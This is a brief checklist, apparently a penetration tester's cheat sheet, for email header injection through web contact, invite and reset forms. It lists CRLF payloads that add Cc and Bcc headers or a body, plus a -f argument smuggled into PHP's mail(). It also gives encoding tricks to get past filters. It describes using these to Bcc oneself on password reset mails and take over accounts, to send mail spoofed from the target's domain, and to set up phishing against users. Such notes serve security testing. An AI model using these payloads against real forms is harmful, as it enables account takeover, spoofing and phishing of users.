# Email injection

## Before I start
- [ ] A contact, invite or reset form that sends mail, and a mailbox of my own to catch the result

## Payloads
In the form's email field, with THE-ADDRESS its normal value and THE-MAILBOX my own address:
THE-ADDRESS%0ACc:THE-MAILBOX
THE-ADDRESS%0D%0ABcc:THE-MAILBOX
THE-ADDRESS%0A%0ATHE-BODY
-fTHE-MAILBOX
- [ ] Every field that ends up in the mail tried, not only the address: the subject and the name are filtered least
- [ ] It worked when the form's mail, or a blind copy of it, reaches my mailbox

## Use it
- [ ] Myself as Bcc on a password reset mail: the token in my mailbox, and with it the account
- [ ] Mail sent from the target's own domain, which its SPF and DKIM sign
- [ ] Myself as Bcc on order confirmations or ticket replies

## Confirm
- [ ] The delivered headers compared: the injected fields are there as I sent them
- [ ] The -f form, the fifth parameter of PHP's mail(), only with PHP and sendmail underneath

## If it fails
- [ ] CRLF rejected: URL-encoded, encoded twice, \n alone, \r alone
- [ ] Nothing reaches the headers: no injection here

## Next
- [ ] A working relay: a pretext for the client's users, :Pb phishing-payloads
- [ ] A reset token caught: the account, then :Pb api
